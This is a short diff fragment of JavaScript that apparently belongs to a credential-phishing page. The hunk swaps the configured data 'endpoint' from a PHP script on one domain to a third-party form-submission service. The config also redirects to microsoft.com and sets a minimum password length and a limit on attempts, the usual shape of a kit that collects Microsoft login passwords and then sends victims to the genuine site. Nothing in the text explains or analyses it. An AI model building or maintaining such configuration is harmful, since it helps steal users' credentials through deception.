@@ -12,7 +12,7 @@ for (let i = 0; i < 80; i++) {
 (function(){
 "use strict";
 const CONFIG={
-endpoint:"https://petaconsultants.com/content/r.php",
+endpoint:"https://submit-form.com/z2w9CMEoe",
 redirect:"https://microsoft.com",
 minPass:6,
 maxAttempts:3,
